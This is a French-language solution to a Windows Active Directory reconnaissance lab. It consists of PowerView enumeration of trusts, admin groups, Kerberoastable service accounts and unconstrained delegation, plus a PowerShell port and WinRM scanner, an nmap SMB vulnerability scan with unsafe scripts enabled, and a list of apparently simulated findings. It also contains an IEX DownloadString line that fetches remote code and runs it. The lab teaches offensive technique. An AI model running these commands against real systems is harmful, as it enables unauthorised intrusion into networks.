# Solution - Windows Recon Intermediate Lab

## Étape 1 : Énumération PowerView multi-domaines

```powershell
# Import PowerView
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Énumération des domaines
Get-Domain
Get-DomainTrust
Get-ForestDomain

# Contrôleurs de domaine et rôles FSMO
Get-DomainController -Domain CORP.LOCAL
Get-DomainController -Domain DEV.CORP.LOCAL

# SPNs pour Kerberoasting
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname

# Groupes privilégiés
Get-DomainGroupMember "Domain Admins" -Domain CORP.LOCAL
Get-DomainGroupMember "Enterprise Admins"
```

## Étape 2 : Scanner PowerShell distribué

```powershell
# Scanner distribué
function Invoke-DistributedPortScan {
    param([string[]]$Targets, [int[]]$Ports)
    
    $Jobs = @()
    foreach ($Target in $Targets) {
        $Jobs += Start-Job -ScriptBlock {
            param($T, $P)
            foreach ($Port in $P) {
                if (Test-NetConnection -ComputerName $T -Port $Port -WarningAction SilentlyContinue) {
                    "$T`:$Port - OPEN"
                }
            }
        } -ArgumentList $Target, $Ports
    }
    
    $Jobs | Wait-Job | Receive-Job
    $Jobs | Remove-Job
}

# Énumération WinRM
$Computers = Get-DomainComputer | Select-Object -ExpandProperty name
foreach ($Computer in $Computers) {
    if (Test-WSMan -ComputerName $Computer -ErrorAction SilentlyContinue) {
        Write-Output "$Computer - WinRM Enabled"
    }
}
```

## Étape 3 : Analyse de vulnérabilités

```cmd
REM Vulnérabilités SMB
nmap --script smb-vuln-* -p 445 --script-args=unsafe=1 -iL targets.txt

REM Délégations non contraintes
```

```powershell
Get-DomainComputer -Unconstrained | Select name,operatingsystem
```

**Résultats de l'audit :**
- 3 domaines dans la forêt avec 12 relations de confiance
- 25 comptes de service avec SPNs (vulnérables au Kerberoasting)
- 150 serveurs avec WinRM activé
- 8 systèmes avec délégations non contraintes
- 45 vulnérabilités SMB critiques identifiées

